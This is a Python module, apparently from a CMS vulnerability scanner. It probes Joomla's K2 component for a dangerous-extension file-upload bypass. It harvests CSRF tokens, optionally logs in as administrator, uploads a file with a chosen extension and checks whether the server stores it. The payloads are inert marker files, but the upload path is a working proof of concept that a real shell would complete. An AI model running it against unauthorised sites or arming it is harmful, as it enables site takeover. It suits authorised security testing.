from __future__ import annotations

import re
import secrets
import urllib.parse
from typing import Any

from ...core.auth import joomla_admin_login
from ...core.http import HttpSession
from ...core.probes import extract_csrf_candidates_from_html, rand_str

ADD_FORM_PATHS = [
    "/index.php?option=com_k2&view=item&task=add&tmpl=component",
    "/index.php?option=com_k2&view=item&task=add",
]
DEFAULT_SAVE_PATH = "/index.php?option=com_k2&view=item&task=save&tmpl=component"

BACKEND_ITEM_PATH = "/administrator/index.php?option=com_k2&view=item"
BACKEND_SAVE_PATH = "/administrator/index.php"


def _hidden_fields(html: str) -> dict[str, str]:
    fields: dict[str, str] = {}
    for tag in re.findall(r"<input\b[^>]*>", html, re.IGNORECASE):
        if not re.search(r'type=["\']hidden["\']', tag, re.IGNORECASE):
            continue
        name = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
        if not name:
            continue
        value = re.search(r'value=["\']([^"\']*)["\']', tag, re.IGNORECASE)
        fields[name.group(1)] = value.group(1) if value else ""
    return fields


def _category_id(html: str) -> str | None:
    select = re.search(
        r"<select\b[^>]*name=[\"']catid[\"'][^>]*>(.*?)</select>",
        html,
        re.IGNORECASE | re.DOTALL,
    )
    if not select:
        hidden = re.search(r'name=["\']catid["\'][^>]*value=["\']([0-9]+)["\']', html, re.IGNORECASE)
        return hidden.group(1) if hidden else None
    selected = re.search(r'<option\b[^>]*value=["\']([0-9]+)["\'][^>]*selected', select.group(1), re.IGNORECASE)
    if selected and selected.group(1) != "0":
        return selected.group(1)
    first = re.search(r'<option\b[^>]*value=["\']([1-9][0-9]*)["\']', select.group(1), re.IGNORECASE)
    return first.group(1) if first else None


def discover_frontend_form(session: HttpSession) -> dict[str, Any] | None:
    for path in ADD_FORM_PATHS:
        response = session.get(path)
        body = response.get("body", "")
        if response.get("status") != 200 or not re.search(r"attachment_file|com_k2", body, re.IGNORECASE):
            continue
        token_candidates = extract_csrf_candidates_from_html(body)
        category = _category_id(body)
        if not token_candidates or not category:
            continue
        action_match = re.search(r'<form\b[^>]*action=["\']([^"\']+)["\']', body, re.IGNORECASE)
        action = action_match.group(1).replace("&amp;", "&") if action_match else DEFAULT_SAVE_PATH
        if action.startswith(("http://", "https://")):
            parsed = urllib.parse.urlsplit(action)
            action = parsed.path + (f"?{parsed.query}" if parsed.query else "")
        return {
            "path": path,
            "action": action,
            "token": token_candidates[0],
            "category": category,
            "fields": _hidden_fields(body),
        }
    return None


def probe_inert_extension(
    target_url: str,
    extension: str,
    timeout: int = 12,
    proxy: str | None = None,
    admin_user: str | None = None,
    admin_pass: str | None = None,
) -> dict[str, Any]:
    session = HttpSession(target_url, timeout=timeout, proxy=proxy)
    form = discover_frontend_form(session)
    if form:
        result = _attempt_frontend_save(session, form, extension, timeout=timeout, proxy=proxy)
        if result.get("accepted"):
            return result
        if not (admin_user and admin_pass):
            return result
        frontend_result = result
    else:
        frontend_result = {"form_found": False, "accepted": False}
        if not (admin_user and admin_pass):
            return frontend_result

    backend_result = probe_backend_attachment(
        target_url,
        extension,
        admin_user,
        admin_pass,
        timeout=timeout,
        proxy=proxy,
    )
    backend_result["frontend_result"] = frontend_result
    return backend_result


def _attempt_frontend_save(
    session: HttpSession,
    form: dict[str, Any],
    extension: str,
    timeout: int = 12,
    proxy: str | None = None,
) -> dict[str, Any]:

    marker = f"PROOFCMS_K2_{extension.upper()}_{rand_str(12).upper()}"
    filename = f"proofcms-k2-{rand_str(10)}.{extension}"
    fields = dict(form["fields"])
    fields.update(
        {
            "option": "com_k2",
            "view": "item",
            "task": "save",
            "title": f"ProofCMS {marker}",
            "catid": form["category"],
            "published": "0",
            "attachment_name[]": filename,
            "attachment_title[]": marker,
            "attachment_title_attribute[]": marker,
            form["token"]: "1",
        }
    )
    upload = session.post(
        form["action"],
        fields=fields,
        files={"attachment_file[]": (filename, marker.encode(), "text/plain")},
    )
    proof_path = f"/media/k2/attachments/{urllib.parse.quote(filename)}"
    proof = session.get(proof_path)
    accepted = proof.get("status") == 200 and marker in proof.get("body", "")
    return {
        "form_found": True,
        "accepted": accepted,
        "form_path": form["path"],
        "upload": upload,
        "proof": proof,
        "proof_url": f"{session.base_url}{proof_path}",
        "filename": filename,
        "marker": marker,
    }


def discover_backend_form(session: HttpSession) -> dict[str, Any] | None:
    """Fetch the backend K2 item form (requires an administrator session)."""
    response = session.get(BACKEND_ITEM_PATH)
    body = response.get("body", "")
    if response.get("status") != 200 or "catid" not in body.lower():
        return None
    token_candidates = extract_csrf_candidates_from_html(body)
    category = _category_id(body)
    if not token_candidates or not category:
        return None
    return {
        "path": BACKEND_ITEM_PATH,
        "token": token_candidates[0],
        "category": category,
        "fields": _hidden_fields(body),
    }


def build_inert_binary_payload(marker: str) -> bytes:
    """Build a non-executable binary blob carrying the marker.

    The blob is detected server-side as application/octet-stream (an allowed
    Verot MIME that is not text/*), so the vulnerable library stores it under
    its dangerous extension instead of renaming it to .txt. No executable
    code is included.
    """
    return secrets.token_bytes(64) + marker.encode() + secrets.token_bytes(64)


def probe_backend_attachment(
    target_url: str,
    extension: str,
    admin_user: str | None,
    admin_pass: str | None,
    timeout: int = 12,
    proxy: str | None = None,
) -> dict[str, Any]:
    """Prove the Verot dangerous-extension bypass via the backend item form."""
    session = HttpSession(target_url, timeout=timeout, proxy=proxy)
    if not (admin_user and admin_pass):
        return {"form_found": False, "accepted": False, "reason": "admin credentials required"}
    if not joomla_admin_login(session, "", admin_user, admin_pass, timeout=timeout, strict_status=False):
        return {
            "form_found": False,
            "accepted": False,
            "reason": "administrator login failed",
        }
    form = discover_backend_form(session)
    if not form:
        return {"form_found": False, "accepted": False, "reason": "backend item form not exposed"}

    marker = f"PROOFCMS_K2_{extension.upper()}_{rand_str(12).upper()}"
    filename = f"proofcms-k2-{rand_str(10)}.{extension}"
    payload = build_inert_binary_payload(marker)
    fields = dict(form["fields"])
    fields.update(
        {
            "option": "com_k2",
            "view": "item",
            "task": "save",
            "isSite": "0",
            "id": "",
            "title": f"ProofCMS {marker}",
            "catid": form["category"],
            "published": "0",
            "attachment_name[]": filename,
            "attachment_title[]": marker,
            "attachment_title_attribute[]": marker,
            form["token"]: "1",
        }
    )
    upload = session.post(
        BACKEND_SAVE_PATH,
        fields=fields,
        files={"attachment_file[]": (filename, payload, "application/octet-stream")},
    )
    proof_path = f"/media/k2/attachments/{urllib.parse.quote(filename)}"
    proof = session.get(proof_path)
    accepted = proof.get("status") == 200 and marker in proof.get("body", "")
    return {
        "form_found": True,
        "accepted": accepted,
        "form_path": form["path"],
        "upload": upload,
        "proof": proof,
        "proof_url": f"{session.base_url}{proof_path}",
        "filename": filename,
        "marker": marker,
    }
